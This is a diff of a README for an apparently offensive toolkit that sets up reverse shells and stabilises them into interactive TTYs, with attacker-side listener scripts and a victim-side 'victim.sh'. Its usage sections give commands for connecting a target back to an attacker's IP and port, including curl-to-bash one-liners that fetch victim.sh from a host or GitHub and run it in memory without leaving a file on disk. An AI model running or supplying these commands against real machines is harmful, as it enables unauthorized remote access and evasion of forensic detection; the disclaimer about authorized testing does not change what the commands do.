@@ -1,54 +1,41 @@
 
 # 🚀 TTY Shell Stabilizer Toolkit
-A collection of scripts to automate the setup of fully interactive TTY environments. These tools handle IP discovery, port listening, and terminal stabilization (Tab-completion, arrow keys, and job control) in one go.
-## 📂 Script Overview
+A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY.
+## 📂 Scripts
 
 | Script | Role | Method |
 |---|---|---|
-| python_tty.sh | Attacker | Uses Python 3/2 pty module (Primary Choice). |
-| bash_tty.sh | Attacker | Uses util-linux script command (Universal Fallback). |
-| victim.sh | Victim | Executes the connection back to the attacker. |
+| python_tty.sh | Attacker | Interactive listener using Python pty. |
+| bash_tty.sh | Attacker | Interactive listener using script command. |
+| victim.sh | Victim | Bash-based reverse shell. |
 
 ------------------------------
-## 🛠 Usage Instructions## 1. Start the Listener (Attacker Side)
-Choose the script based on what you expect to find on the victim's machine.
-If the victim has Python installed:
+## 🛠 Usage Instructions
+To use these scripts, follow the parameter formats below:
+## 1. Attacker Side (Listeners)
+Run the script followed by the desired port. If you do not specify a port, the script will show you the usage guide.
+Python Version:
 
 ./python_tty.sh <port>
 
-If the victim is a minimal system (No Python):
+Bash Version:
 
 ./bash_tty.sh <port>
 
-The script will automatically detect your local IP and display the command the victim needs to run.
 ------------------------------
-## 2. Trigger the Connection (Victim Side)
-Once the listener is active, run the following on the target machine:
+## 2. Victim Side (Connection)
+On the target machine, provide both the attacker's IP and the listening port.
 
 ./victim.sh <attacker_ip> <port>
 
-Example:
-If your Kali IP is 10.0.13.7 and you are listening on 4444:
-
-chmod +x victim.sh
-./victim.sh 10.0.13.7 4444
-
 ------------------------------
-## 💡 Quick Tips## Execution without Uploading (victim.sh)
-If you cannot upload the victim.sh file to the target, you can host it on your Kali machine and pipe it directly to bash:
+## 💡 Quick Tips## Execution via Remote Pipe
+If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:
 
-   1. Host it: python3 -m http.server 80
-   2. Execute in memory:
-   
-   curl http://<your_ip>/victim.sh | bash -s -- <your_ip> <port>
-   
-   
-## Terminal Recovery
-If the connection drops and your Kali terminal feels "broken" (no text appears when you type), simply type:
+curl -s https://raw.githubusercontent.com/x86david/kali_interactive_tty/refs/heads/master/victim.sh | bash -s -- <attacker_ip> <port>
 
-reset
-
-This will restore your terminal's normal behavior.
+## ⚠️ Recovery
+If the session ends and your terminal stops displaying your typing, type reset and press Enter to restore your local environment.
 ------------------------------
-Disclaimer: For authorized security testing and educational purposes only.
-
+Disclaimer: For authorized security testing and administrative purposes only. !!!!!!!
+------------------------------
